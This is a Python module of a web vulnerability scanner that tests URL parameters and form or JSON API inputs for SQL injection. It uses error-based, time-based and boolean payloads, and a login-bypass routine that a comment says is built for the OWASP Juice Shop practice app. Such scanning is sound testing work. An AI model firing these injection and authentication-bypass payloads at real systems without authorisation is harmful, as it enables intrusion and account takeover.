import time
import json
from typing import Optional, List
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import requests

from scanner_core.scanner import Vulnerability
from .base_tester import BaseTester


class SqliTester(BaseTester):
    def __init__(self, session: requests.Session, config: dict):
        super().__init__(session, config)
        self.error_payloads = self.config.get('error_based_payloads', [])
        self.time_payloads = self.config.get('time_based_payloads', [])
        self.boolean_payloads = self.config.get('boolean_based_payloads', [])
        self.error_patterns = self.config.get('error_patterns', [])
        self.time_delay_threshold = self.config.get('time_delay_seconds', 4)

    def test(self, url: str) -> List[Vulnerability]:
        vulns = []
        parsed_url = urlparse(url)
        if not parsed_url.query: return vulns

        query_params = parse_qs(parsed_url.query)
        base_response = self.fetch(url)
        if not base_response: return vulns

        for param in query_params:
            original_value = query_params[param]

            for payload in self.error_payloads:
                try:
                    resp = self._inject_payload(parsed_url, query_params, param, payload)
                    if resp and any(err.lower() in resp.text.lower() for err in self.error_patterns):
                        safe_val = "123456"
                        safe_resp = self._inject_payload(parsed_url, query_params, param, safe_val)
                        if not (any(err.lower() in safe_resp.text.lower() for err in
                                    self.error_patterns) if safe_resp else False):
                            vulns.append(Vulnerability(type='SQL Injection', subcategory='Error-Based', url=url,
                                                       details={'parameter': param, 'payload': payload,
                                                                'evidence': 'SQL error message appeared with payload but disappeared with safe input.'},
                                                       severity='High'))
                            break
                except requests.RequestException:
                    continue

            for payload in self.time_payloads:
                try:
                    start_time = time.time()
                    self._inject_payload(parsed_url, query_params, param, payload)
                    elapsed_time = time.time() - start_time
                    if elapsed_time > self.time_delay_threshold:
                        start_verify = time.time()
                        self._inject_payload(parsed_url, query_params, param, str(original_value[0]))
                        elapsed_verify = time.time() - start_verify
                        if elapsed_verify < 2:
                            vulns.append(Vulnerability(type='SQL Injection', subcategory='Time-Based', url=url,
                                                       details={'parameter': param, 'payload': payload,
                                                                'response_time_payload': f'{elapsed_time:.2f}s',
                                                                'response_time_normal': f'{elapsed_verify:.2f}s',
                                                                'evidence': 'Server response was significantly delayed by the payload.'},
                                                       severity='High'))
                            break
                except requests.RequestException:
                    continue

            true_payload = "' AND 1=1--"
            false_payload = "' AND 1=2--"
            try:
                resp_true = self._inject_payload(parsed_url, query_params, param, true_payload)
                resp_false = self._inject_payload(parsed_url, query_params, param, false_payload)
                if resp_true and resp_false:
                    sim_true = self._calculate_similarity(base_response.text, resp_true.text)
                    sim_false = self._calculate_similarity(base_response.text, resp_false.text)
                    if sim_true > 0.95 and sim_false < 0.90:
                        vulns.append(Vulnerability(type='SQL Injection', subcategory='Boolean-Based', url=url,
                                                   details={'parameter': param, 'true_payload': true_payload,
                                                            'false_payload': false_payload,
                                                            'evidence': 'Response content differs significantly between TRUE and FALSE conditions.'},
                                                   severity='High'))
                        break
            except requests.RequestException:
                continue
        return vulns

    def test_form(self, form_data: dict) -> List[Vulnerability]:
        vulns = []
        url = form_data['url']
        method = form_data.get('method', 'POST').upper()
        inputs = form_data['inputs']
        is_api = form_data.get('is_api', False) or any(k in url.lower() for k in ['/api/', '/rest/', '/v1/', '/v2/'])

        base_resp = self._inject_form_payload(url, method, inputs, None, None, is_api)

        for target_input in inputs:
            if target_input.get('type') in ['hidden', 'submit', 'radio', 'button']: continue
            param = target_input['name']

            # --- AUTH BYPASS CHUYÊN DỤNG CHO JUICE SHOP ---
            if is_api and method == 'POST':
                auth_bypass_payloads = ["' OR 1=1--", "admin@juice-sh.op'--", "' OR true--"]
                for payload in auth_bypass_payloads:
                    try:
                        resp = self._inject_form_payload(url, method, inputs, param, payload, is_api)
                        if resp and resp.status_code in [200, 201]:
                            if any(k in resp.text.lower() for k in
                                   ['token', 'session', 'success', 'jwt', 'user', 'authentication']):
                                vulns.append(Vulnerability(
                                    type='SQL Injection', subcategory='Authentication Bypass (API)', url=url,
                                    details={'parameter': f"JSON Body: {param}", 'payload': payload,
                                             'evidence': 'Successful authentication bypass using SQL injection payload in JSON API.'},
                                    severity='Critical'
                                ))
                                break
                    except requests.RequestException:
                        pass

            true_payload = "' AND 1=1--"
            false_payload = "' AND 1=2--"
            try:
                resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api)
                resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api)
                if resp_true and resp_false and base_resp:
                    sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
                    sim_false = self._calculate_similarity(base_resp.text, resp_false.text)
                    if (sim_true > 0.95 and sim_false < 0.90) or (
                            resp_true.status_code == 200 and resp_false.status_code >= 400):
                        vulns.append(Vulnerability(
                            type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
                            details={'parameter': f"Body/Query: {param}", 'true_payload': true_payload,
                                     'false_payload': false_payload,
                                     'evidence': f'Response differs significantly between TRUE and FALSE logic inside {method} payload.'},
                            severity='Critical'
                        ))
                        break
            except requests.RequestException:
                pass
        return vulns

    def _inject_payload(self, parsed_url, params, target_param, payload):
        test_params = params.copy()
        test_params[target_param] = payload
        test_url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
        return self.session.get(test_url, timeout=10, verify=False, headers={'ngrok-skip-browser-warning': 'true'})

    def _inject_form_payload(self, url, method, inputs, target_param, payload, is_api=False):
        data = {}
        for inp in inputs:
            if target_param and inp['name'] == target_param:
                data[inp['name']] = payload
            else:
                data[inp['name']] = inp.get('value', 'test')

        headers = {'ngrok-skip-browser-warning': 'true', 'Accept': 'application/json, text/plain, */*'}
        try:
            if method == 'GET':
                return self.session.get(url, params=data, timeout=10, verify=False, headers=headers)

            if is_api:
                headers['Content-Type'] = 'application/json'
                if method == 'PUT': return self.session.put(url, json=data, timeout=10, verify=False, headers=headers)
                return self.session.post(url, json=data, timeout=10, verify=False, headers=headers)
            else:
                return self.session.post(url, data=data, timeout=10, verify=False, headers=headers)
        except Exception:
            return None